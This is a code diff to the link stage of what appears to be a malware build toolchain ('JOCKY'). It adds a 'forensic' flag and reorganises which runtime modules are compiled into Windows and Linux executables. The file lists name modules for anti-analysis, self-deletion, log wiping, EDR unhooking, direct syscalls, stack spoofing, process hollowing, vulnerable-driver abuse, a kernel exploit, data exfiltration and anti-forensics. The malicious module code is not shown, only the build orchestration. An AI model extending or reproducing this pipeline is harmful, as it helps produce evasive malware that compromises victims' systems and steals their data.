@@ -23,6 +23,8 @@ class LinkStage(Stage):
         else:
             target_os = "linux"
 
+        forensic = bool(ctx.config.get("forensic"))
+
         # Determine output executable path
         if ctx.config.get("output"):
             output = Path(ctx.config["output"])
@@ -38,7 +40,7 @@ class LinkStage(Stage):
                 str(tc.clang()), "--target=x86_64-pc-windows-gnu", "-c", str(obf_bc), "-o", str(obj_path)
             ], "Bitcode to Windows object")
 
-            runtime_objs = self._compile_runtime(tc, out_dir, target_os)
+            runtime_objs = self._compile_runtime(tc, out_dir, target_os, forensic)
 
             # Use clang cross-linker for Windows (MinGW path)
             mingw_lib = "/usr/x86_64-w64-mingw32/lib"
@@ -56,7 +58,7 @@ class LinkStage(Stage):
                 str(tc.clang()), "--target=x86_64-pc-linux-gnu", "-c", str(obf_bc), "-o", str(obj_path)
             ], "Bitcode to Linux object")
 
-            runtime_objs = self._compile_runtime(tc, out_dir, target_os)
+            runtime_objs = self._compile_runtime(tc, out_dir, target_os, forensic)
 
             link_cmd = [
                 str(tc.clang()), "--target=x86_64-pc-linux-gnu", str(obj_path)
@@ -75,16 +77,18 @@ class LinkStage(Stage):
                 return Path(p)
         return None
 
-    def _compile_runtime(self, tc, out_dir: Path, target_os: str) -> list:
+    def _compile_runtime(self, tc, out_dir: Path, target_os: str, forensic: bool = False) -> list:
         """Compile the JOCKY runtime C sources and return list of .o paths."""
         script_dir = Path(__file__).parent.parent.parent.parent
         runtime_dir = script_dir / "src" / "runtime"
         if not runtime_dir.exists():
             return []
 
+        windows_dir = runtime_dir / "windows"
+
         # Portable sources (always compiled)
         portable_sources = [
-            runtime_dir / "init" / "anti_analysis.c",
+            runtime_dir / "init"    / "anti_analysis.c",
             runtime_dir / "cleanup" / "self_delete.c",
             runtime_dir / "cleanup" / "logs.c",
         ]
@@ -93,22 +97,30 @@ class LinkStage(Stage):
         windows_sources = []
         if target_os == "windows":
             windows_sources = [
-                runtime_dir / "util"         / "mem.c",
-                runtime_dir / "windows"      / "windows_utils.c",
-                runtime_dir / "windows"      / "registry" / "registry.c",
-                runtime_dir / "evasion"      / "unhook.c",
-                runtime_dir / "evasion"      / "syscalls.c",
-                runtime_dir / "evasion"      / "stack_spoof.c",
-                runtime_dir / "execution"    / "hollow.c",
-                runtime_dir / "execution"    / "byovd.c",
-                runtime_dir / "execution"    / "inmem.c",
-                runtime_dir / "execution"    / "driver_interact.c",
-                runtime_dir / "exploitation" / "kernel_exploit.c",
-                runtime_dir / "exfil"        / "exfil.c",
-                runtime_dir / "cleanup"      / "forensics.c",
+                runtime_dir / "util"           / "mem.c",
+                windows_dir / "windows_utils.c",
+                windows_dir / "registry"       / "registry.c",
+                windows_dir / "evasion"        / "unhook.c",
+                windows_dir / "evasion"        / "syscalls.c",
+                windows_dir / "evasion"        / "stack_spoof.c",
+                windows_dir / "execution"      / "hollow.c",
+                windows_dir / "execution"      / "byovd.c",
+                windows_dir / "execution"      / "inmem.c",
+                windows_dir / "execution"      / "driver_interact.c",
+                windows_dir / "exploitation"   / "kernel_exploit.c",
+                runtime_dir / "exfil"          / "exfil.c",
+            ]
+            if forensic:
+                windows_sources.append(windows_dir / "anti_forensics" / "forensics.c")
+
+        # Linux-only sources
+        linux_sources = []
+        if target_os == "linux" and forensic:
+            linux_sources = [
+                runtime_dir / "linux" / "forensics" / "linux_forensics.c",
             ]
 
-        all_sources = [s for s in portable_sources + windows_sources if s.exists()]
+        all_sources = [s for s in portable_sources + windows_sources + linux_sources if s.exists()]
         if not all_sources:
             return []
 
